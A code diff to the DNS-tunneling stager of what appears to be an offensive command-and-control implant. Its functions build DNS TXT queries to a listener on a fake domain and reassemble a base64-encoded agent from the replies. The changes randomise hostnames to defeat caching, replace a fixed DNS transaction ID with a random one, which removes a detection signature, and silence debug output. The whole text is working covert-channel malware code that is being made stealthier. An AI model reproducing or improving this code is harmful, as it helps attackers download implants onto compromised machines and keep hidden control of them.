@@ -730,7 +730,11 @@ def build_routing_packet(stagingKey, sessionID, meta=0, additional=0, encData=''
     return packet
 
 def pack_hostname_txt(prefix, counter, fake_domain):
-    hostname = prefix + str(counter) + '.' + fake_domain
+    # add random char to avoid DNS caching
+    if prefix.startswith(taskingtxthostname):
+        hostname = prefix + chr(random.randint(97,122)) + str(counter) + '.' + fake_domain
+    else:
+        hostname = prefix + str(counter) + '.' + fake_domain
     print "[pack_hostname_txt] packing hostname for TXT {}".format(hostname)
     bytes_txt_host = bytearray()
     for label in hostname.split('.'):
@@ -743,7 +747,12 @@ def pack_hostname_txt(prefix, counter, fake_domain):
     return bytes_txt_host
 
 def pack_hostname_init(prefix, fake_domain):
-    hostname = prefix + '.' + fake_domain
+    # add random char to avoid DNS caching
+    if prefix.startswith(taskingtxthostname):
+        hostname = prefix + chr(random.randint(97,122)) + '.' + fake_domain
+    else:
+        hostname = prefix + '.' + fake_domain
+    
     print "[pack_hostname_init] packing hostname for init {}".format(hostname)
     bytes_init_host = bytearray()
     for label in hostname.split('.'):
@@ -772,18 +781,17 @@ def pack_hostname_a(prefix, labels, fake_domain):
     tmp=struct.pack(format_str,domain_list[0])
     fake_len=struct.pack('B',len(domain_list[0]))
 
-
     format_str_suffix='{}s'.format(len(domain_list[1]))
     tmp_suffix=struct.pack(format_str_suffix,domain_list[1])
     fake_len_suffix=struct.pack('B',len(domain_list[1]))
 
-    
     bytes_fake_host=fake_len+(bytes(tmp))+fake_len_suffix+(bytes(tmp_suffix))
     bytes_fake_host=bytes_fake_host+struct.pack('x')
     
     return bytes_prefix_host + labels + bytes_fake_host
 
 def extract_payload(payload):
+    # FIXME verify if 12: offset is correct
     ba = bytearray(payload[12:])
     tmpstr = ""
     hostname = []
@@ -804,7 +812,7 @@ def extract_payload(payload):
     return label
 
 def send_init_txt_to_listener(sock, prefix, host, port, fake_domain):
-    txn_id_bytes = bytearray(struct.pack('>H', int("e347",16)))
+    txn_id_bytes = bytearray(struct.pack('>H', random.randint(4096,65535)))
     dns_flags = txn_id_bytes + bytearray(struct.pack('BBBBBBBBBB',1,0,0,1,0,0,0,0,0,0))
     bytes_txt_host = pack_hostname_init(prefix, fake_domain)
     txt_request = dns_flags + bytes_txt_host + bytearray(struct.pack('BBBB',0,16,0,1))
@@ -844,10 +852,10 @@ def recv_data_from_listener(prefix, sock, fake_domain, host, port):
         except socket.timeout:
             pass
     ba = bytearray()
-    print agent_base64
+    #print agent_base64
     for ele in agent_base64:
         ba.extend(binascii.a2b_base64(ele))
-    print 'agent recv via stager length {}'.format(len(ba))
+    #print 'agent recv via stager length {}'.format(len(ba))
     a=str(ba)
     return a
 
